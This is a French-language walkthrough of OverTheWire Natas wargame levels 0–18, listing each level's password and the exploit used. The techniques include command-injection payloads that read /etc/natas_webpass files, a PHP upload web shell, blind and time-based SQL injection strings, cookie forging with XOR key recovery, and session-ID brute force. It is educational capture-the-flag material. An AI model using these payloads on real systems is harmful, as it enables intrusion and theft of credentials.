# Natas

http://overthewire.org/wargames/natas/

# 0 et 1
<p>
<details>
<summary> Caché</summary>


> natas0:natas0

> natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto

Réponse dans les commentaires

</details></p>


# 2
<p>
<details>
<summary> Caché</summary>


> natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

Réponse dans /files/users.txt (découvert grace au chemin du pixel)

</details></p>


# 3
<p>
<details>
<summary> Caché</summary>


>natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

Réponse dans /s3cr3t/users.txt (découvert grace au robots.txt)

</details></p>


# 4 
<p>
<details>
<summary> Caché</summary>


>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

*Forger la requête*

Ajouter une entete `Referer: http://natas5.natas.labs.overthewire.org/`

</details></p>


# 5
<p>
<details>
<summary> Caché</summary>


>natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

*Forger la requête*

Dans le cookie, changer `loggedin=1`

</details></p>


# 6
<p>
<details>
<summary> Caché</summary>


>natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

Découvrir le secret dans les sources de /includes/secret.inc

</details></p>


# 7

<p>
<details>
<summary> Caché</summary>


>natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

Le paramètre de requête "page" permet d'ouvrir n'importe quel fichier du serveur. Demander `page=/etc/natas_webpass/natas8`

</details></p>


# 8

<p>
<details>
<summary> Caché</summary>


>natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

Le secret initial se retrouve simplement à partir du secret encodé :
```php
base64_decode(strrev(hex2bin($encodedSecret)));
```

</details></p>


# 9

<p>
<details>
<summary> Caché</summary>


>natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

*Injection de code OS*

Le champ est directement injecté dans la ligne `grep -i $key dictionary.txt`

On peut donc renseigner par exemple `; less /etc/natas_webpass/natas10 ;`

</details></p>


# 10

<p>
<details>
<summary> Caché</summary>


>natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

*Injection de code OS*

Un peu plus fin que le précédent il faut vraiment utiliser la commande grep qui peut prendre plusieurs fichiers en paramètre. Il faut ensuite tester différents caractères jusqu'à en trouver un qui est contenu dans le mot de passe.

On peut donc renseigner par exemple : `c /etc/natas_webpass/natas11 `

</details></p>


# 11

<p>
<details>
<summary> Caché</summary>

>natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

*Forger la requête*

Le cookie par défaut contient l'information suivante :
```json
{"showpassword":"no","bgcolor":"#ffffff"}
``` 

Le stockage est réalisé après un "chiffrement" XOR et un encodage base64.
```
data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```

La clé du XOR est cachée dans le code. Cependant en utilisant la relation :
```
A XOR B = C <=> A XOR C = B
```
on peut facilement retrouver la clé initiale en calculant :
```php
$key = '{"showpassword":"no","bgcolor":"#ffffff"}';
$text = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');
$outText = '';
for($i=0;$i<strlen($text);$i++) {
 $outText .= $text[$i] ^ $key[$i % strlen($key)];
}
```
```
> outText = qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```
On en déduit que la clé du XOR est : `qw8J`

On peut ainsi reprendre le code initial en remettant la clé et à chiffrer :
```json
{"showpassword":"yes","bgcolor":"#ffffff"}
``` 
```php
function xor_encrypt($in) {
 $key = 'qw8J';
 $text = $in;
 $outText = '';
 for($i=0;$i<strlen($text);$i++) {
  $outText .= $text[$i] ^ $key[$i % strlen($key)];
 }
 return $outText;
}
base64_encode(xor_encrypt('{"showpassword":"yes","bgcolor":"#ffffff"}'))
```

Ce qui donne :
```
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

</details></p>


# 12

<p>
<details>
<summary> Caché</summary>

>natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

*Forger la requête*

*Injection de code OS*

Injecter le fichier php en annexe en renseignant comme 'filename' `quelquechose.php` : seule l'extention de ce paramètre est lue et permet de déterminer l'extension du code final.

Le script va ainsi déposer le fichier sur le serveur sous un nom aléatoire mais avec l'extension .php : upload/hmf6ksgvr4.php par exemple. 

L'extension .php va provoquer le déclenchement du moteur php et exécuter le code situé dans le fichier : `passthru("less /etc/natas_webpass/natas13");`

</details>

# 13

<p>
<details>
<summary> Caché</summary>
 
>natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

*Forger la requête*

*Injection de code OS*

Même exercice que le précédent mais cette fois un vérification complémentaire est effectuée pour vérifier que le fichier est vraiment une image (fonction exif_imagetype).

La vérification porte sur la lecture des premiers octets. Une façon simple de résoudre le problème est donc d'ajouter le code php précédent au corps d'une image. Le fichier en annexe a été construit ainsi et provoque le même résultat que précédemment.

</details>

# 14

<p>
<details>
<summary> Caché</summary>
 
>natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

*Injection de code SQL*

Requete lancée :
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
Si on renseigne username : `natas15"  #` la requete devient :
```sql
SELECT * from users where username="natas15" # " and password=""
```

</details>

# 15

<p>
<details>
<summary> Caché</summary>
 
>natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

*Injection de code SQL*

*Brute force*

Requete lancée :
```php
 $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
```
Si on renseigne username : `natas16" AND password LIKE BINARY "a%"  #` la requete devient :
```sql
SELECT * from users where username="natas16" AND password LIKE BINARY "a%"  #"
```
et on peut ainsi vérifier si le mot de passe de natas16 commence par a. (instruction BINARY pour réaliser des coparaison case sensitive)

En itérant sur tous les caractères on finit par obtenir le mot de passe complet (Exemple de code pour résoudre en annexe).

</details>


# 16

<p>
<details>
<summary> Caché</summary>

>natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

*Injection de code OS*

*Brute force*

Comme dans 9 et 10 sauf que la commande lancée est maintenant : 
```
grep -i "$key" dictionary.txt
```
(avec des guillemets autour de l'entrée utilisateur) et les caractères interdits sont ;|&`'"

On peut cependant injecter du code via l'écriture `$()` qui execute du code au sein d'une chaîne de caratères encapsulée dans "".

L'idée va être d'injecter des instructions de la forme `$(grep ^a /etc/natas_webpass/natas17)` pour voir si le mot de passe commence par a. Pour le valider on choisit un mot du dictionnaire assez long pour que rajouter n'importe quel caractère aboutisse à une réponse vide. Par exemple `Easters`.

La requete `needle=easters$(grep ^a /etc/natas_webpass/natas17)` provoquera la requete effective :
- si le mot de passe de natas 17 commence par un a : 
```
grep -i eastersMotDePasseNatas17 dictionary.txt
```
et ne renverra donc aucun résult
- si le mot de passe ne commence pas par un a :
```
grep -i easters dictionary.txt
```
et renverra donc Easters comme résultat.

La présence de `Easters` dans la réponse nous indique donc l'échec de notre proposition de début de mot de passe.

En itérant sur tous les caractères on finit par obtenir le mot de passe complet (Exemple de code pour résoudre en annexe).

</details>

# 17

<p>
<details>
<summary> Caché</summary>

>natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

*Injection de code SQL*

*Brute force*

Même exercice que le 15 mais cette fois toutes les sorties sont mises en commentaire côté php et il devient impossible de distinguer dans le corps une différence entre user exists ou non.

Une différence peut être créée au niveau des temps de réponse grace à l'instruction SLEEP(n) qui provoque une pause de n secondes dans le processus côté base de données.

En rajoutant l'instruction `AND SLEEP(2)` : si la ligne matche, une requete valide répondra en 2 secondes au lieu de quelques millisecondes.

On va donc renseigner username : `natas18" AND password LIKE BINARY "a%" AND SLEEP(2) #` et la requete devient :
```sql
SELECT * from users where username="natas18" AND password LIKE BINARY "a%" AND SLEEP(2) #"
```

En itérant sur tous les caractères on finit par obtenir le mot de passe complet (Exemple de code pour résoudre en annexe).

</details>

# 18

<p>
<details>
<summary> Caché</summary>

>natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

*Forger la requête*

*Vol de session*

D'après le code les identifiants de session ne vont que de 0 à 640. Il suffit alors de tester tous les identifiants de sessions possibles en espérant tomber sur un compte admin.

Le code en annexe propose jusqu'à trouver un identifiant que affiche le mot de passe l'entête :
```
Cookie: PHPSESSID=identifiantSession
```
dans la requête.

</details>

